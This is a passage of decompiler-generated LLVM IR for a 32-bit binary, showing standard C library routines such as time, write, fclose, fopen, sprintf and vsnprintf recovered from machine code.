  %tmp12 = icmp ult i32 %v7_804db6b, -4095
  br i1 %tmp12, label %dec_label_pc_804db85, label %dec_label_pc_804db77

dec_label_pc_804db77:                             ; preds = %dec_label_pc_804db5e
  %v1_804db77 = call i32 @__errno_location(i32 %v0_804db63)
  %v0_804db7c = load i32, i32* %esi.global-to-local, align 4
  %v1_804db7c = sub i32 0, %v0_804db7c
  %v2_804db7e = inttoptr i32 %v1_804db77 to i32*
  store i32 %v1_804db7c, i32* %v2_804db7e, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804db85

dec_label_pc_804db85:                             ; preds = %dec_label_pc_804db77, %dec_label_pc_804db5e, %dec_label_pc_804db4e
  %storemerge = phi i32 [ -1, %dec_label_pc_804db4e ], [ %v7_804db6b, %dec_label_pc_804db5e ], [ -1, %dec_label_pc_804db77 ]
  %v2_804db85 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804db85, i32* @edx, align 4
  store i32 %v0_804db35, i32* @esi, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v7_804db6b, { 1, 0, 2 }
  uselistorder i32 %v0_804db63, { 1, 0 }
  uselistorder %_TYPEDEF_sigset_t* %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @__GI_time(i32* %arg1) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %tmp3 = ptrtoint i32* %arg1 to i32
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804db8c = load i32, i32* @edi, align 4
  store i32 %v0_804db8c, i32* %stack_var_-4, align 4
  store i32 %tmp3, i32* %edi.global-to-local, align 4
  %v0_804db94 = load i32, i32* @ebx, align 4
  %v2_804db9c = call i32 @time(i32* %arg1)
  store i32 %v0_804db94, i32* @ebx, align 4
  store i32 %v2_804db9c, i32* %edi.global-to-local, align 4
  %tmp9 = icmp ult i32 %v2_804db9c, -4095
  br i1 %tmp9, label %dec_label_pc_804dbb4, label %dec_label_pc_804dba8

dec_label_pc_804dba8:                             ; preds = %entry
  %v1_804dba8 = call i32 @__errno_location(i32 %v0_804db94)
  %v0_804dbad = load i32, i32* %edi.global-to-local, align 4
  %v1_804dbad = sub i32 0, %v0_804dbad
  %v2_804dbaf = inttoptr i32 %v1_804dba8 to i32*
  store i32 %v1_804dbad, i32* %v2_804dbaf, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_804dbb4

dec_label_pc_804dbb4:                             ; preds = %entry, %dec_label_pc_804dba8
  %v0_804dbb4 = phi i32 [ %v2_804db9c, %entry ], [ -1, %dec_label_pc_804dba8 ]
  %v2_804dbb6 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804dbb6, i32* @edx, align 4
  %v2_804dbb8 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804dbb8, i32* @edi, align 4
  ret i32 %v0_804dbb4

; uselistorder directives
  uselistorder i32 %v2_804db9c, { 1, 0, 2 }
  uselistorder i32 %v0_804db94, { 1, 0 }
  uselistorder label %dec_label_pc_804dbb4, { 1, 0 }
}

define i32 @__libc_waitpid(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v4_804dbcd = call i32 @wait4(i32 %arg1, i32 %arg2, i32 %arg3, i32 0)
  ret i32 %v4_804dbcd
}

define i32 @__libc_write(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804dbd8 = load i32, i32* @edi, align 4
  store i32 %v0_804dbd8, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  %v0_804dbe8 = load i32, i32* @ebx, align 4
  %v4_804dbf0 = call i32 @write(i32 %arg1, i32* %arg2, i32 %arg3)
  store i32 %v0_804dbe8, i32* @ebx, align 4
  store i32 %v4_804dbf0, i32* %edi.global-to-local, align 4
  %tmp11 = icmp ult i32 %v4_804dbf0, -4095
  br i1 %tmp11, label %dec_label_pc_804dc08, label %dec_label_pc_804dbfc

dec_label_pc_804dbfc:                             ; preds = %entry
  %v1_804dbfc = call i32 @__errno_location(i32 %v0_804dbe8)
  %v0_804dc01 = load i32, i32* %edi.global-to-local, align 4
  %v1_804dc01 = sub i32 0, %v0_804dc01
  %v2_804dc03 = inttoptr i32 %v1_804dbfc to i32*
  store i32 %v1_804dc01, i32* %v2_804dc03, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_804dc08

dec_label_pc_804dc08:                             ; preds = %entry, %dec_label_pc_804dbfc
  %v0_804dc08 = phi i32 [ %v4_804dbf0, %entry ], [ -1, %dec_label_pc_804dbfc ]
  %v2_804dc0a = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804dc0a, i32* @edx, align 4
  %v2_804dc0c = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804dc0c, i32* @edi, align 4
  ret i32 %v0_804dc08

; uselistorder directives
  uselistorder i32 %v4_804dbf0, { 1, 0, 2 }
  uselistorder i32 %v0_804dbe8, { 1, 0 }
  uselistorder label %dec_label_pc_804dc08, { 1, 0 }
}

define i32 @isspace(i32 %arg1) local_unnamed_addr {
entry:
  %v0_804dc14 = load i32, i32* inttoptr (i32 134586040 to i32*), align 8
  %v2_804dc19 = mul i32 %arg1, 2
  %v3_804dc19 = add i32 %v0_804dc14, %v2_804dc19
  %v4_804dc19 = inttoptr i32 %v3_804dc19 to i16*
  %v5_804dc19 = load i16, i16* %v4_804dc19, align 2
  %v6_804dc19 = zext i16 %v5_804dc19 to i32
  %v1_804dc1d = and i32 %v6_804dc19, 32
  ret i32 %v1_804dc1d
}

define i32 @__GI_toupper(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @edx, align 4
  %v1_804dc28 = add i32 %arg1, 128
  %v6_804dc33 = icmp ugt i32 %v1_804dc28, 383
  br i1 %v6_804dc33, label %dec_label_pc_804dc3e, label %dec_label_pc_804dc35

dec_label_pc_804dc35:                             ; preds = %entry
  %v0_804dc35 = load i32, i32* inttoptr (i32 134586048 to i32*), align 64
  %v2_804dc3a = mul i32 %arg1, 2
  %v3_804dc3a = add i32 %v0_804dc35, %v2_804dc3a
  %v4_804dc3a = inttoptr i32 %v3_804dc3a to i16*
  %v5_804dc3a = load i16, i16* %v4_804dc3a, align 2
  %v6_804dc3a = sext i16 %v5_804dc3a to i32
  store i32 %v6_804dc3a, i32* @edx, align 4
  br label %dec_label_pc_804dc3e

dec_label_pc_804dc3e:                             ; preds = %entry, %dec_label_pc_804dc35
  %v0_804dc3e = phi i32 [ %arg1, %entry ], [ %v6_804dc3a, %dec_label_pc_804dc35 ]
  ret i32 %v0_804dc3e

; uselistorder directives
  uselistorder label %dec_label_pc_804dc3e, { 1, 0 }
}

define i32 @__errno_location(i32 %arg1) local_unnamed_addr {
entry:
  ret i32 ptrtoint (i32* @global_var_80603c0.194 to i32)
}

define i32 @__GI_fclose(i16* %arg1) local_unnamed_addr {
entry:
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v0_804dc4c = load i32, i32* @ebp, align 4
  %v0_804dc4d = load i32, i32* @edi, align 4
  %v0_804dc4e = load i32, i32* @esi, align 4
  %v0_804dc4f = load i32, i32* @ebx, align 4
  %v4_804dc53 = ptrtoint i16* %arg1 to i32
  store i32 %v4_804dc53, i32* @esi, align 4
  %v1_804dc57 = add i32 %v4_804dc53, 52
  %v2_804dc57 = inttoptr i32 %v1_804dc57 to i32*
  %v3_804dc57 = load i32, i32* %v2_804dc57, align 4
  store i32 %v3_804dc57, i32* @ebp, align 4
  %v1_804dc5a = icmp eq i32 %v3_804dc57, 0
  %v1_804dc5c = icmp eq i1 %v1_804dc5a, false
  br i1 %v1_804dc5c, label %dec_label_pc_804dc7d, label %dec_label_pc_804dc5e

dec_label_pc_804dc5e:                             ; preds = %entry
  %v1_804dc5e = add i32 %v4_804dc53, 56
  store i32 %v1_804dc5e, i32* @ebx, align 4
  %v2_804dc68 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_804dc68, i32* @eax, align 4
  %v2_804dc6d = call i32 @__pthread_return_void(i32 %v2_804dc68, i32 134550911)
  %v0_804dc72 = load i32, i32* @ebx, align 4
  %v1_804dc75 = call i32 @__pthread_return_0(i32 %v0_804dc72)
  store i32 %v1_804dc75, i32* @eax, align 4
  %v0_804dc7f.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804dc7d

dec_label_pc_804dc7d:                             ; preds = %entry, %dec_label_pc_804dc5e
  %v0_804dc87 = phi i32 [ %v4_804dc53, %entry ], [ %v0_804dc7f.pre, %dec_label_pc_804dc5e ]
  store i32 0, i32* @edi, align 4
  %v1_804dc7f = inttoptr i32 %v0_804dc87 to i8*
  %v2_804dc7f = load i8, i8* %v1_804dc7f, align 1
  %v3_804dc7f = and i8 %v2_804dc7f, 64
  %v4_804dc7f = icmp eq i8 %v3_804dc7f, 0
  br i1 %v4_804dc7f, label %dec_label_pc_804dc7d.dec_label_pc_804dc92_crit_edge, label %dec_label_pc_804dc84

dec_label_pc_804dc7d.dec_label_pc_804dc92_crit_edge: ; preds = %dec_label_pc_804dc7d
  br label %dec_label_pc_804dc92

dec_label_pc_804dc84:                             ; preds = %dec_label_pc_804dc7d
  %v1_804dc88 = inttoptr i32 %v0_804dc87 to i16*
  %v2_804dc88 = call i32 @fflush_unlocked(i16* %v1_804dc88)
  store i32 %v2_804dc88, i32* @edi, align 4
  %v0_804dc95.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804dc92

dec_label_pc_804dc92:                             ; preds = %dec_label_pc_804dc7d.dec_label_pc_804dc92_crit_edge, %dec_label_pc_804dc84
  %v0_804dc95 = phi i32 [ %v0_804dc87, %dec_label_pc_804dc7d.dec_label_pc_804dc92_crit_edge ], [ %v0_804dc95.pre, %dec_label_pc_804dc84 ]
  %v1_804dc95 = add i32 %v0_804dc95, 4
  %v2_804dc95 = inttoptr i32 %v1_804dc95 to i32*
  %v3_804dc95 = load i32, i32* %v2_804dc95, align 4
  %v1_804dc98 = call i32 @__libc_close(i32 %v3_804dc95)
  store i32 %v1_804dc98, i32* @eax, align 4
  %v2_804dca0 = icmp slt i32 %v1_804dc98, 0
  %v1_804dca2 = icmp eq i1 %v2_804dca0, false
  br i1 %v1_804dca2, label %dec_label_pc_804dca7, label %dec_label_pc_804dca4

dec_label_pc_804dca4:                             ; preds = %dec_label_pc_804dc92
  store i32 -1, i32* @edi, align 4
  br label %dec_label_pc_804dca7

dec_label_pc_804dca7:                             ; preds = %dec_label_pc_804dc92, %dec_label_pc_804dca4
  %v0_804dca7 = load i32, i32* @esi, align 4
  %v1_804dca7 = add i32 %v0_804dca7, 4
  %v2_804dca7 = inttoptr i32 %v1_804dca7 to i32*
  store i32 -1, i32* %v2_804dca7, align 4
  %v2_804dcb9 = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_804dcb9, i32* @ebx, align 4
  %v2_804dcbe = call i32 @__pthread_return_void(i32 %v2_804dcb9, i32 134550911)
  %v1_804dcca = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_8059ef4.195 to i32))
  %v0_804dccf = load i32, i32* @global_var_805e184.196, align 4
  %v1_804dcd4 = add i32 %v0_804dccf, 1
  store i32 %v1_804dcd4, i32* @global_var_805e184.196, align 4
  store i32 ptrtoint (i32* @global_var_8059ef4.195 to i32), i32* @eax, align 4
  %v2_804dcdf = call i32 @__pthread_return_void(i32 %v2_804dcb9, i32 1)
  store i32 %v2_804dcdf, i32* @eax, align 4
  %v0_804dce7 = load i32, i32* @esi, align 4
  %v1_804dce7 = inttoptr i32 %v0_804dce7 to i16*
  %v2_804dce7 = load i16, i16* %v1_804dce7, align 2
  %v3_804dce7 = and i16 %v2_804dce7, 24576
  store i16 %v3_804dce7, i16* %v1_804dce7, align 2
  %v0_804dcec = load i32, i32* @esi, align 4
  %v1_804dcec = inttoptr i32 %v0_804dcec to i16*
  %v2_804dcec = load i16, i16* %v1_804dcec, align 2
  %v3_804dcec = or i16 %v2_804dcec, 48
  store i16 %v3_804dcec, i16* %v1_804dcec, align 2
  br i1 %v1_804dc5c, label %dec_label_pc_804dd05, label %dec_label_pc_804dcf4

dec_label_pc_804dcf4:                             ; preds = %dec_label_pc_804dca7
  %v2_804dcf8 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_804dcf8, i32* @eax, align 4
  %v2_804dcfd = call i32 @__pthread_return_void(i32 %v2_804dcf8, i32 1)
  store i32 %v2_804dcfd, i32* @eax, align 4
  br label %dec_label_pc_804dd05

dec_label_pc_804dd05:                             ; preds = %dec_label_pc_804dca7, %dec_label_pc_804dcf4
  %v0_804dd05 = load i32, i32* @esi, align 4
  %v1_804dd05 = add i32 %v0_804dd05, 1
  %v2_804dd05 = inttoptr i32 %v1_804dd05 to i8*
  %v3_804dd05 = load i8, i8* %v2_804dd05, align 1
  %v4_804dd05 = and i8 %v3_804dd05, 64
  %v5_804dd05 = icmp eq i8 %v4_804dd05, 0
  br i1 %v5_804dd05, label %dec_label_pc_804dd19, label %dec_label_pc_804dd0b

dec_label_pc_804dd0b:                             ; preds = %dec_label_pc_804dd05
  %v1_804dd0e = add i32 %v0_804dd05, 8
  %v2_804dd0e = inttoptr i32 %v1_804dd0e to i32*
  %v3_804dd0e = load i32, i32* %v2_804dd0e, align 4
  %v1_804dd11 = call i32 @free(i32 %v3_804dd0e)
  store i32 %v1_804dd11, i32* @eax, align 4
  br label %dec_label_pc_804dd19

dec_label_pc_804dd19:                             ; preds = %dec_label_pc_804dd05, %dec_label_pc_804dd0b
  %v2_804dd25 = call i32 @__pthread_return_void(i32 %v2_804dcb9, i32 134550911)
  %v1_804dd31 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_8059ef4.195 to i32))
  store i32 ptrtoint (i32* @global_var_8059ef4.195 to i32), i32* @eax, align 4
  %v0_804dd38 = load i32, i32* @global_var_805e188.197, align 8
  %v1_804dd38 = add i32 %v0_804dd38, 1
  store i32 %v1_804dd38, i32* @global_var_805e188.197, align 8
  %v2_804dd41 = call i32 @__pthread_return_void(i32 %v2_804dcb9, i32 1)
  %v0_804dd46 = call i32 @_stdio_openlist_dec_use()
  %v0_804dd4e = load i32, i32* @edi, align 4
  store i32 %v0_804dc4f, i32* @ebx, align 4
  store i32 %v0_804dc4e, i32* @esi, align 4
  store i32 %v0_804dc4d, i32* @edi, align 4
  store i32 %v0_804dc4c, i32* @ebp, align 4
  ret i32 %v0_804dd4e

; uselistorder directives
  uselistorder label %dec_label_pc_804dd19, { 1, 0 }
  uselistorder label %dec_label_pc_804dd05, { 1, 0 }
  uselistorder label %dec_label_pc_804dca7, { 1, 0 }
  uselistorder label %dec_label_pc_804dc92, { 1, 0 }
  uselistorder label %dec_label_pc_804dc7d, { 1, 0 }
}

define i32 @__GI_fopen(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v4_804dd67 = inttoptr i32 %arg2 to i8*
  %v5_804dd67 = call i32 @_stdio_fopen(i32 %arg1, i8* %v4_804dd67, i32 0, i32 -1)
  ret i32 %v5_804dd67
}

define i32 @sprintf(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_12 = alloca i32, align 4
  %v2_804dd73 = ptrtoint i32* %stack_var_12 to i32
  %v4_804dd86 = inttoptr i32 %arg1 to i8*
  %v5_804dd86 = call i32 @__GI_vsnprintf(i8* %v4_804dd86, i32 -1, i32 %arg2, i32 %v2_804dd73)
  ret i32 %v5_804dd86
}

define i32 @__GI_vsnprintf(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-96 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_804dd90 = load i32, i32* @ebp, align 4
  %v0_804dd91 = load i32, i32* @edi, align 4
  %v0_804dd92 = load i32, i32* @esi, align 4
  %v0_804dd93 = load i32, i32* @ebx, align 4
  store i32 %v0_804dd93, i32* %stack_var_-16, align 4
  %v4_804dd97 = ptrtoint i8* %arg1 to i32
  store i32 %v4_804dd97, i32* @esi, align 4
  %v2_804dd9b = ptrtoint i32* %stack_var_-40 to i32
  store i32 %arg2, i32* @edi, align 4
  store i32 208, i32* %stack_var_-96, align 4
  %v2_804ddcc = ptrtoint i32* %stack_var_-96 to i32
  store i32 %v2_804ddcc, i32* @ebp, align 4
  %v1_804ddd0 = sub i32 -1, %v4_804dd97
  store i32 %v1_804ddd0, i32* @ebx, align 4
  %v1_804ddd3 = call i32 @__stdio_init_mutex(i32 %v2_804dd9b)
  %v0_804dde3 = load i32, i32* @ebx, align 4
  %v1_804dde3 = load i32, i32* @edi, align 4
  %tmp35 = icmp ugt i32 %v0_804dde3, %v1_804dde3
  br i1 %tmp35, label %dec_label_pc_804dde7, label %dec_label_pc_804dde9

dec_label_pc_804dde7:                             ; preds = %entry
  store i32 %v1_804dde3, i32* @ebx, align 4
  br label %dec_label_pc_804dde9

dec_label_pc_804dde9:                             ; preds = %entry, %dec_label_pc_804dde7
  %v1_804dde9 = phi i32 [ %v0_804dde3, %entry ], [ %v1_804dde3, %dec_label_pc_804dde7 ]
  %v0_804dde9 = load i32, i32* @esi, align 4
  %v2_804dde9 = add i32 %v0_804dde9, %v1_804dde9
  %v4_804de14 = inttoptr i32 %arg3 to i8*
  %v5_804de14 = call i32 @_vfprintf_internal(i32 %v2_804ddcc, i8* %v4_804de14, i32 %arg4, i32 %v2_804dde9)
  store i32 %v5_804de14, i32* @edx, align 4
  %v0_804de1e = load i32, i32* @ebx, align 4
  %v1_804de1e = icmp eq i32 %v0_804de1e, 0
  br i1 %v1_804de1e, label %dec_label_pc_804de38, label %dec_label_pc_804de22

dec_label_pc_804de22:                             ; preds = %dec_label_pc_804dde9
  %v16_804de26 = icmp eq i32 %v1_804dde9, 0
  %v1_804de2a = icmp eq i1 %v16_804de26, false
  br i1 %v1_804de2a, label %dec_label_pc_804de31, label %dec_label_pc_804de2c

dec_label_pc_804de2c:                             ; preds = %dec_label_pc_804de22
  %v1_804de2c = add i32 %v2_804dde9, -1
  br label %dec_label_pc_804de31

dec_label_pc_804de31:                             ; preds = %dec_label_pc_804de22, %dec_label_pc_804de2c
  %stack_var_-80.0.in = phi i32 [ %v0_804dde9, %dec_label_pc_804de22 ], [ %v1_804de2c, %dec_label_pc_804de2c ]
  %stack_var_-80.0 = inttoptr i32 %stack_var_-80.0.in to i8*
  store i8 0, i8* %stack_var_-80.0, align 1
  %v0_804de3b.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_804de38

dec_label_pc_804de38:                             ; preds = %dec_label_pc_804dde9, %dec_label_pc_804de31
  %v0_804de3b = phi i32 [ %v5_804de14, %dec_label_pc_804dde9 ], [ %v0_804de3b.pre, %dec_label_pc_804de31 ]
  %v2_804de3d = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_804de3d, i32* @ebx, align 4
  store i32 %v0_804dd92, i32* @esi, align 4
  store i32 %v0_804dd91, i32* @edi, align 4
  store i32 %v0_804dd90, i32* @ebp, align 4
  ret i32 %v0_804de3b

; uselistorder directives
  uselistorder i32 %v0_804dde9, { 1, 0 }
  uselistorder i32 %v1_804dde9, { 1, 0 }
  uselistorder i32 %v1_804dde3, { 1, 2, 0 }
  uselistorder i32 %v0_804dde3, { 1, 0 }
  uselistorder i32* %stack_var_-96, { 1, 0 }
  uselistorder label %dec_label_pc_804de38, { 1, 0 }
  uselistorder label %dec_label_pc_804de31, { 1, 0 }
  uselistorder label %dec_label_pc_804dde9, { 1, 0 }
}

define i32 @_stdio_fopen(i32 %arg1, i8* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-76 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_804de44 = load i32, i32* @ebp, align 4
  %v0_804de45 = load i32, i32* @edi, align 4
  %v0_804de46 = load i32, i32* @esi, align 4
  %v0_804de47 = load i32, i32* @ebx, align 4
  store i32 %v0_804de47, i32* %stack_var_-16, align 4
  %v4_804de4b = ptrtoint i8* %arg2 to i32
  store i32 %v4_804de4b, i32* @edx, align 4
  store i32 %arg1, i32* @esi, align 4
  store i32 %arg3, i32* @ebp, align 4
  store i32 %arg4, i32* @edi, align 4
  %v2_804de5b = load i8, i8* %arg2, align 1
  %v3_804de5b = zext i8 %v2_804de5b to i32
  %v4_804de5b = load i32, i32* @eax, align 4
  %v5_804de5b = and i32 %v4_804de5b, -256
  %v6_804de5b = or i32 %v5_804de5b, %v3_804de5b
  store i32 %v6_804de5b, i32* %eax.global-to-local, align 4
  %v10_804de5d = icmp eq i8 %v2_804de5b, 114
  br i1 %v10_804de5d, label %dec_label_pc_804de9f, label %dec_label_pc_804de61

dec_label_pc_804de61:                             ; preds = %entry
  store i32 577, i32* @ebx, align 4
  %v10_804de66 = icmp eq i8 %v2_804de5b, 119
  br i1 %v10_804de66, label %dec_label_pc_804dea1, label %dec_label_pc_804de6a

dec_label_pc_804de6a:                             ; preds = %dec_label_pc_804de61
  store i32 1089, i32* @ebx, align 4
  %v10_804de6e = icmp eq i8 %v2_804de5b, 97
  br i1 %v10_804de6e, label %dec_label_pc_804dea1, label %dec_label_pc_804de72

dec_label_pc_804de72:                             ; preds = %dec_label_pc_804df1a, %dec_label_pc_804def4, %dec_label_pc_804de6a
  %v0_804de72 = load i32, i32* %stack_var_-16, align 4
  %v1_804de72 = call i32 @__errno_location(i32 %v0_804de72)
  store i32 %v1_804de72, i32* %eax.global-to-local, align 4
  %v0_804de77 = load i32, i32* @ebp, align 4
  %v1_804de77 = icmp eq i32 %v0_804de77, 0
  %v1_804de79 = inttoptr i32 %v1_804de72 to i32*
  store i32 22, i32* %v1_804de79, align 4
  br i1 %v1_804de77, label %dec_label_pc_804e067, label %dec_label_pc_804de85

dec_label_pc_804de85:                             ; preds = %dec_label_pc_804df43, %dec_label_pc_804de72
  %v0_804de85 = load i32, i32* @ebp, align 4
  %v1_804de85 = add i32 %v0_804de85, 1
  %v2_804de85 = inttoptr i32 %v1_804de85 to i8*
  %v3_804de85 = load i8, i8* %v2_804de85, align 1
  %v4_804de85 = and i8 %v3_804de85, 32
  %v5_804de85 = icmp eq i8 %v4_804de85, 0
  br i1 %v5_804de85, label %dec_label_pc_804e067, label %dec_label_pc_804de8f

dec_label_pc_804de8f:                             ; preds = %dec_label_pc_804de85
  store i32 %v0_804de85, i32* %stack_var_-76, align 4
  %v1_804de93 = call i32 @free(i32 %v0_804de85)
  store i32 %v1_804de93, i32* %eax.global-to-local, align 4
  store i32 0, i32* @ebp, align 4
  br label %dec_label_pc_804e062

dec_label_pc_804de9f:                             ; preds = %entry
  store i32 0, i32* @ebx, align 4
  br label %dec_label_pc_804dea1

dec_label_pc_804dea1:                             ; preds = %dec_label_pc_804de6a, %dec_label_pc_804de61, %dec_label_pc_804de9f
  %v0_804deb2 = phi i32 [ 1089, %dec_label_pc_804de6a ], [ 577, %dec_label_pc_804de61 ], [ 1, %dec_label_pc_804de9f ]
  %v1_804dea1 = add i32 %v4_804de4b, 1
  store i32 %v1_804dea1, i32* %eax.global-to-local, align 4
  %v2_804dea4 = inttoptr i32 %v1_804dea1 to i8*
  %v3_804dea4 = load i8, i8* %v2_804dea4, align 1
  %v12_804dea4 = icmp eq i8 %v3_804dea4, 98
  br i1 %v12_804dea4, label %dec_label_pc_804deac, label %dec_label_pc_804deaa

dec_label_pc_804deaa:                             ; preds = %dec_label_pc_804dea1
  store i32 %v4_804de4b, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804deac

dec_label_pc_804deac:                             ; preds = %dec_label_pc_804dea1, %dec_label_pc_804deaa
  %v0_804deac = phi i32 [ %v1_804dea1, %dec_label_pc_804dea1 ], [ %v4_804de4b, %dec_label_pc_804deaa ]
  %v1_804deac = add i32 %v0_804deac, 1
  %v2_804deac = inttoptr i32 %v1_804deac to i8*
  %v3_804deac = load i8, i8* %v2_804deac, align 1
  %v12_804deac = icmp eq i8 %v3_804deac, 43
  %v1_804deb0 = icmp eq i1 %v12_804deac, false
  br i1 %v1_804deb0, label %dec_label_pc_804deba, label %dec_label_pc_804deb2

dec_label_pc_804deb2:                             ; preds = %dec_label_pc_804deac
  store i32 %v0_804deb2, i32* %eax.global-to-local, align 4
  %v1_804deb7 = add nuw nsw i32 %v0_804deb2, 1
  store i32 %v1_804deb7, i32* @ebx, align 4
  br label %dec_label_pc_804deba

dec_label_pc_804deba:                             ; preds = %dec_label_pc_804deac, %dec_label_pc_804deb2
  %v1_804deba = icmp eq i32 %arg3, 0
  %v1_804debc = icmp eq i1 %v1_804deba, false
  br i1 %v1_804debc, label %dec_label_pc_804def0, label %dec_label_pc_804debe

dec_label_pc_804debe:                             ; preds = %dec_label_pc_804deba
  store i32 80, i32* %stack_var_-76, align 4
  %v1_804dec3 = call i32 @malloc(i32 80)
  store i32 %v1_804dec3, i32* %eax.global-to-local, align 4
  store i32 %v1_804dec3, i32* @ebp, align 4
  %v2_804decd = icmp eq i32 %v1_804dec3, 0
  br i1 %v2_804decd, label %dec_label_pc_804e069, label %dec_label_pc_804ded5

dec_label_pc_804ded5:                             ; preds = %dec_label_pc_804debe
  %v2_804dec3 = inttoptr i32 %v1_804dec3 to i16*
  store i16 8192, i16* %v2_804dec3, align 2
  %v2_804dedd = add i32 %v1_804dec3, 8
  %v3_804dedd = inttoptr i32 %v2_804dedd to i32*
  store i32 0, i32* %v3_804dedd, align 4
  %v2_804dee4 = add i32 %v1_804dec3, 56
  store i32 %v2_804dee4, i32* %eax.global-to-local, align 4
  store i32 %v2_804dee4, i32* %stack_var_-76, align 4
  %v1_804dee8 = call i32 @__stdio_init_mutex(i32 %v2_804dee4)
  store i32 %v1_804dee8, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804def0

dec_label_pc_804def0:                             ; preds = %dec_label_pc_804deba, %dec_label_pc_804ded5
  %v2_804def0 = icmp slt i32 %arg4, 0
  br i1 %v2_804def0, label %dec_label_pc_804df3d, label %dec_label_pc_804def4

dec_label_pc_804def4:                             ; preds = %dec_label_pc_804def0
  %v0_804def4 = load i32, i32* @ebx, align 4
  %v0_804def6 = load i32, i32* @esi, align 4
  %v1_804def6 = add i32 %v0_804def6, 1
  store i32 %v1_804def6, i32* %eax.global-to-local, align 4
  %v1_804def9 = and i32 %v0_804def4, 32771
  store i32 %v1_804def9, i32* %edx.global-to-local, align 4
  %v1_804deff = load i32, i32* @ebp, align 4
  %v2_804deff = add i32 %v1_804deff, 4
  %v3_804deff = inttoptr i32 %v2_804deff to i32*
  store i32 %arg4, i32* %v3_804deff, align 4
  %v0_804df02 = load i32, i32* %edx.global-to-local, align 4
  %v1_804df02 = add i32 %v0_804df02, 1
  store i32 %v1_804df02, i32* @edx, align 4
  %v0_804df03 = load i32, i32* %eax.global-to-local, align 4
  %v2_804df03 = and i32 %v0_804df03, %v1_804df02
  store i32 %v2_804df03, i32* %eax.global-to-local, align 4
  %v12_804df05 = icmp eq i32 %v2_804df03, %v1_804df02
  %v1_804df07 = icmp eq i1 %v12_804df05, false
  br i1 %v1_804df07, label %dec_label_pc_804de72, label %dec_label_pc_804df0d

dec_label_pc_804df0d:                             ; preds = %dec_label_pc_804def4
  %v0_804df0d = load i32, i32* @esi, align 4
  %v1_804df0f = and i32 %v0_804df0d, 1024
  %v1_804df11 = xor i32 %v1_804df0f, 1024
  store i32 %v1_804df11, i32* %eax.global-to-local, align 4
  %v1_804df16 = load i32, i32* @ebx, align 4
  %v2_804df16 = and i32 %v1_804df16, %v1_804df11
  %v3_804df16 = icmp eq i32 %v2_804df16, 0
  br i1 %v3_804df16, label %dec_label_pc_804df0d.dec_label_pc_804df33_crit_edge, label %dec_label_pc_804df1a

dec_label_pc_804df0d.dec_label_pc_804df33_crit_edge: ; preds = %dec_label_pc_804df0d
  br label %dec_label_pc_804df33

dec_label_pc_804df1a:                             ; preds = %dec_label_pc_804df0d
  store i32 %arg4, i32* %stack_var_-76, align 4
  %v3_804df23 = call i32 @__libc_fcntl(i32 %arg4, i32 4, i32 1024)
  store i32 %v3_804df23, i32* %eax.global-to-local, align 4
  %v1_804df2b = icmp eq i32 %v3_804df23, 0
  %v1_804df2d = icmp eq i1 %v1_804df2b, false
  br i1 %v1_804df2d, label %dec_label_pc_804de72, label %dec_label_pc_804df1a.dec_label_pc_804df33_crit_edge

dec_label_pc_804df1a.dec_label_pc_804df33_crit_edge: ; preds = %dec_label_pc_804df1a
  %v0_804df33.pre = load i32, i32* @esi, align 4
  %v0_804df39.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804df33

dec_label_pc_804df33:                             ; preds = %dec_label_pc_804df0d.dec_label_pc_804df33_crit_edge, %dec_label_pc_804df1a.dec_label_pc_804df33_crit_edge
  %v0_804df39 = phi i32 [ %v1_804df16, %dec_label_pc_804df0d.dec_label_pc_804df33_crit_edge ], [ %v0_804df39.pre, %dec_label_pc_804df1a.dec_label_pc_804df33_crit_edge ]
  %v0_804df33 = phi i32 [ %v0_804df0d, %dec_label_pc_804df0d.dec_label_pc_804df33_crit_edge ], [ %v0_804df33.pre, %dec_label_pc_804df1a.dec_label_pc_804df33_crit_edge ]
  %v1_804df33 = and i32 %v0_804df33, 32768
  %v2_804df39 = or i32 %v1_804df33, %v0_804df39
